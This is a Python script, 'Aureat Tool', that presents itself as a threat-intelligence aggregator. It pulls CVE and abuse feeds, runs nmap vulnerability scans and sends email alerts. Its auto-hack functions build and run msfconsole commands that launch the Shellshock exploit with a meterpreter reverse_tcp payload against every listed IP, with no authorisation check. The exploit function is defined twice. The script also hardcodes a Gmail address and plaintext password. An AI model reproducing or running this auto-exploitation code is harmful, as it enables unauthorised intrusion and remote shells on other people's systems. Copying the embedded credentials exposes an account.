#!/usr/bin/env python3
import requests
import smtplib
import os
import argparse
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import subprocess
import time
import sys
import socket 
import nmap

# Email Configuration
SENDER_EMAIL = "aureat.tool@gmail.com"
PASSWORD = "Aureat@4991!"
RECEIVER_EMAIL = None  # Will be set via CLI

# Threat Feeds
THREAT_FEEDS = {
    "CVE": "https://cve.circl.lu/api/last",
    "Abuse": "https://feodotracker.abuse.ch/downloads/ipblocklist.csv",
    "Malware": "https://malwaredatabase.com/api/latest"  # Hypothetical API
}

VERSION = "Aureat Tool v2.5"
MONITORED_DEVICES = []
WORKING_DIR = os.getcwd()
REPORTS_PATH = os.path.join(WORKING_DIR, "aureat_reports")
DEVICES_FILE = os.path.join(WORKING_DIR, "monitored_devices.txt")

# Create directories if they don't exist
if not os.path.exists(REPORTS_PATH):
    os.makedirs(REPORTS_PATH)

def display_header():
    print("___________________________________________________________")
    print("|                                                          |")
    subprocess.run(["figlet", "            Aureat"])
    print("|   Automated Threat Intelligence Aggregator Tool          |")
    print("|                Created by Garogenius                     |")
    print("|__________________________________________________________|")

def load_devices():
    global MONITORED_DEVICES
    MONITORED_DEVICES = []
    if os.path.exists(DEVICES_FILE):
        with open(DEVICES_FILE, "r") as f:
            for line in f:
                try:
                    name, ip, device_type = line.strip().split(" - ")
                    MONITORED_DEVICES.append({"ip": ip, "name": name, "type": device_type})
                except ValueError:
                    print(f"Invalid device format in line: {line}")
    else:
        print(f"No device file found at {DEVICES_FILE}. Starting fresh...")

def save_devices():
    with open(DEVICES_FILE, "w") as f:
        for device in MONITORED_DEVICES:
            f.write(f"{device['name']} - {device['ip']} - {device['type']}\n")
    print(f"Monitored devices saved to {DEVICES_FILE}.")

def add_device(ip_address, name, device_type):
    load_devices()
    if ip_address.count('.') != 3:
        print("Invalid IP address format.")
        return
    MONITORED_DEVICES.append({"ip": ip_address, "name": name, "type": device_type})
    print(f"Device {ip_address} ({name}, {device_type}) added to monitoring list.")
    scan_output = scan_device_for_vulns(ip_address, device_type)
    save_devices()
    return scan_output

def remove_device(ip_address):
    load_devices()
    global MONITORED_DEVICES
    device_found = False
    for device in MONITORED_DEVICES:
        if device['ip'] == ip_address:
            MONITORED_DEVICES.remove(device)
            device_found = True
            print(f"Device {ip_address} removed from monitoring list.")
            save_devices()
            break
    if not device_found:
        print(f"Device with IP {ip_address} not found.")

def drop_all_devices():
    global MONITORED_DEVICES
    MONITORED_DEVICES = []
    print("All devices have been removed from the monitoring list.")
    save_devices()

def list_monitored_devices():
    load_devices()
    if MONITORED_DEVICES:
        print("Devices in monitoring list:")
        for device in MONITORED_DEVICES:
            print(f"{device['name']} - {device['ip']} ({device['type']})")
    else:
        print("No devices in the monitoring list.")

def send_email_alert(subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, PASSWORD)
            server.send_message(msg)
        print(f"Email alert sent to {RECEIVER_EMAIL}.")
        
    except smtplib.SMTPAuthenticationError:
        print("Error: Authentication failed. Check your credentials or enable App Passwords.")
    except Exception as e:
        print(f"Unexpected error: {e}")

def fetch_threat_data():
    threat_data = []
    for feed_name, feed_url in THREAT_FEEDS.items():
        try:
            response = requests.get(feed_url)
            if feed_name == "Abuse":
                data = response.text.splitlines()
                for line in data:
                    try:
                        threat_data.append({"ip": line.split(',')[0], "description": line})
                    except IndexError:
                        continue  # Skip malformed lines
            else:
                data = response.json()
                threat_data.extend(data)
            print(f"Fetched {len(data)} records from {feed_name}.")
        except requests.RequestException as e:
            print(f"Error fetching data from {feed_name}: {e}")
    return threat_data

def scan_device_for_vulns(ip_address, device_type):
    print(f"Starting vulnerability scan for {ip_address} ({device_type})...")
    nm = nmap.PortScanner()
    try:
        nm.scan(ip_address, arguments='-sV --script vuln')

        scan_output = []
        for host in nm.all_hosts():
            scan_output.append(f"Scan results for {host}:")
            for proto in nm[host].all_protocols():
                for port in nm[host][proto]:
                    state = nm[host][proto][port]['state']
                    service = nm[host][proto][port]['name']
                    output = f"Port {port}: {service} is {state}"
                    scan_output.append(output)
                    print(output)
                    
                    if 'script' in nm[host][proto][port]:
                        for script in nm[host][proto][port]['script']:
                            vulnerability_output = f"Vulnerability: {script} -> {nm[host][proto][port]['script'][script]}"
                            scan_output.append(vulnerability_output)
                            print(vulnerability_output)

        return "\n".join(scan_output)
    except Exception as e:
        print(f"Error during Nmap scan: {e}")

def correlate_threats(threat_data):
    correlated_threats = []
    for threat in threat_data:
        for device in MONITORED_DEVICES:
            if 'ip' in threat and threat['ip'] == device['ip']:
                correlated_threats.append({
                    "device": device['name'],
                    "threat": threat
                })
    return correlated_threats

def generate_report(correlated_threats, title="Threat Report"):
    if not correlated_threats:
        print("No detected threats.")
        report_file = os.path.join(REPORTS_PATH, f"{title.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        with open(report_file, "w") as f:
            f.write("No detected threats at this time.")
        print(f"Report saved to {report_file}.")
        return report_file

    report_content = "\n".join([f"Device: {t['device']}, Threat: {t['threat']['description']}" for t in correlated_threats])
    report_file = os.path.join(REPORTS_PATH, f"{title.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(report_file, "w") as f:
        f.write(report_content)
    print(f"Report saved to {report_file}.")
    return report_file

def detect_dangerous_threats(threat_data):
    dangerous_threats = [threat for threat in threat_data if isinstance(threat, dict) and (
        "critical" in threat.get('severity', '').lower() or "malware" in threat.get('description', '').lower())]
    return dangerous_threats

def send_feedback(title, content):
    feedback_subject = f"Feedback: {title}"
    send_email_alert(feedback_subject, content)
    print(f"Feedback sent to the developer: {feedback_subject}")

def alert_on_threats(threat_data):
    dangerous_threats = detect_dangerous_threats(threat_data)
    if dangerous_threats:
        print("Dangerous threats detected.")
        report_file = generate_report(dangerous_threats, title="Dangerous Threat Report")
        send_email_alert("Dangerous Threats Detected", f"Threat report generated: {report_file}")
    else:
        print("No dangerous threats detected.")
        #///////////////////////////////////////////////////
def get_local_ip():
    """Helper function to get the local IP address of the attacker's machine."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external server (Google DNS) to get the local IP
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"  # Fallback to localhost if an error occurs
    finally:
        s.close()
    return local_ip

def exploit_device(ip_address, scan_results):
    # This function now integrates with Metasploit to exploit vulnerabilities
    try:
        local_ip = get_local_ip()  # Get local IP address to set as LHOST
        # Dynamically generate a Metasploit command based on the scan results
        if "CVE" in scan_results:
            # You can implement a mapping table from CVE to Metasploit modules if needed
            exploit_module = "exploit/multi/http/apache_mod_cgi_bash_env_exec"
        else:
            # Default to a general exploit handler
            exploit_module = "exploit/multi/handler"

        # Check if a reverse shell payload is used and inject LHOST
        msf_command = (
            f"msfconsole -q -x 'use {exploit_module}; "
            f"set RHOSTS {ip_address}; set PAYLOAD linux/x86/meterpreter/reverse_tcp; "
            f"set LHOST {local_ip}; run'"
        )
        
        print(f"Running exploitation command:\n{msf_command}")
        
        # Execute the Metasploit command with the appropriate options
        subprocess.run(msf_command, shell=True)
        print(f"Exploitation attempt completed for {ip_address} using {exploit_module}.")
    
    except Exception as e:
        print(f"Error exploiting {ip_address}: {e}")

def auto_hack_devices():
    load_devices()
    for device in MONITORED_DEVICES:
        print(f"Attempting auto-hack on {device['name']} ({device['ip']})...")
        
        # Step 1: Scan for vulnerabilities on the device
        scan_results = scan_device_for_vulns(device['ip'], device['type'])
        print("Vulnerabilities found:")
        print(scan_results)
        
        # Step 2: Launch exploitation attempts
        exploit_device(device['ip'], scan_results)

def exploit_device(ip_address, scan_results):
    # Now we complete the Metasploit-based exploitation process based on vulnerabilities found.
    # We will match any relevant CVEs or services to known Metasploit modules.
    
    try:
        # Dynamically generate a Metasploit command based on the scan results
        # Example CVE exploit:
        if "CVE" in scan_results:
            # You can implement a mapping table from CVE to Metasploit modules if needed
            exploit_module = "exploit/multi/http/apache_mod_cgi_bash_env_exec"
        else:
            # Default to a general exploit handler
            exploit_module = "exploit/multi/handler"
        
        msf_command = (
            f"msfconsole -q -x 'use {exploit_module}; set RHOSTS {ip_address}; "
            f"set PAYLOAD linux/x86/meterpreter/reverse_tcp; run'"
        )
        
        # Execute the msfconsole command to run the exploit
        subprocess.run(msf_command, shell=True)
        print(f"Exploitation attempt completed for {ip_address} using {exploit_module}.")
    
    except Exception as e:
        print(f"Error exploiting {ip_address}: {e}")

def auto_checker(interval=600):
    while True:
        print("Running auto-check for new threats...")
        threat_data = fetch_threat_data()
        correlated_threats = correlate_threats(threat_data)
        if correlated_threats:
            report_file = generate_report(correlated_threats)
            send_email_alert("New Threats Detected", f"Threat report generated: {report_file}")
        else:
            print("No new correlated threats. Sending a notification...")
            send_email_alert("No New Threats Detected", "No threats detected at this time.")
        print(f"Next check in {interval // 60} minutes...")
        time.sleep(interval)

def main():
    display_header()

    global RECEIVER_EMAIL
    parser = argparse.ArgumentParser(description='Aureat Tool - Automated Threat Intelligence Aggregator')
    parser.add_argument('--version', action='version', version=VERSION)
    parser.add_argument('--add', nargs=3, help='Add a device to monitoring: <ip_address> <name> <type>')
    parser.add_argument('--remove', help='Remove a device from monitoring: <ip_address>')
    parser.add_argument('--list', action='store_true', help='List monitored devices')
    parser.add_argument('--drop-all', action='store_true', help='Remove all monitored devices')
    parser.add_argument('--feedback', nargs=2, help='Send feedback: <title> <content>')
    parser.add_argument('--set-email', '-e', help='Set the email address for alerts.')
    parser.add_argument('--start', action='store_true', help='Start the automatic threat detection.')
    parser.add_argument('--auto-hack', action='store_true', help='Start auto-hacking all monitored devices every 5 minutes.')
    parser.add_argument('--fetch', action='store_true', help='Fetch latest threat data from feeds.')
    parser.add_argument('--correlate', action='store_true', help='Correlate fetched threats with monitored devices.')
    parser.add_argument('--dg', action='store_true', help='Detect dangerous threats and alert.')
    parser.add_argument('--scan-device', help='Manually initiate a scan for a specific device by IP')
    parser.add_argument('--report', action='store_true', help='Generate a threat report for monitored devices')
    parser.add_argument('--email-report', action='store_true', help='Email the generated report')
    parser.add_argument('--display-scan', action='store_true', help='Display the scan results in the terminal')
    parser.add_argument('--check', action='store_true', help='Start automatic check for threats every 10 minutes')
    parser.add_argument('--hack', action='store_true', help='Start auto-hack for monitored devices every 5 minutes')
    parser.add_argument('--email', metavar='EMAIL', help='Set receiver email for alerts')

    args = parser.parse_args()

    if args.email:
        RECEIVER_EMAIL = args.email

    load_devices()

    if args.add:
        ip_address, name, device_type = args.add
        scan_output = add_device(ip_address, name, device_type)
        if args.display_scan:
            print(scan_output)

    if args.remove:
        remove_device(args.remove)

    if args.list:
        list_monitored_devices()

    if args.drop_all:
        drop_all_devices()

    if args.feedback:
        title, content = args.feedback
        send_feedback(title, content)

    if args.start:
        print("Starting automatic threat detection...")
        auto_checker()

    if args.auto_hack:
        print("Starting auto-hack for monitored devices...")
        auto_hack_devices()

    if args.fetch:
        print("Fetching latest threat data...")
        threat_data = fetch_threat_data()

    if args.correlate:
        print("Correlating fetched threats with monitored devices...")
        threat_data = fetch_threat_data()
        correlated_threats = correlate_threats(threat_data)
        if correlated_threats:
            generate_report(correlated_threats)

    if args.dg:
        print("Detecting dangerous threats...")
        threat_data = fetch_threat_data()
        alert_on_threats(threat_data)

    if args.scan_device:
        scan_output = scan_device_for_vulns(args.scan_device, "User Initiated")
        if args.display_scan:
            print(scan_output)

    if args.report:
        threat_data = fetch_threat_data()
        correlated_threats = correlate_threats(threat_data)
        generate_report(correlated_threats)

    if args.email_report:
        print("Generating and sending email report...")
        threat_data = fetch_threat_data()
        correlated_threats = correlate_threats(threat_data)
        report_file = generate_report(correlated_threats)
        send_email_alert("Threat Report", f"Report generated: {report_file}")

    if args.check:
        auto_checker(interval=600)  # Check every 10 minutes

    if args.hack:
        print("Implementing auto-hack feature...")
        auto_hack_devices()

if __name__ == "__main__":
    main()
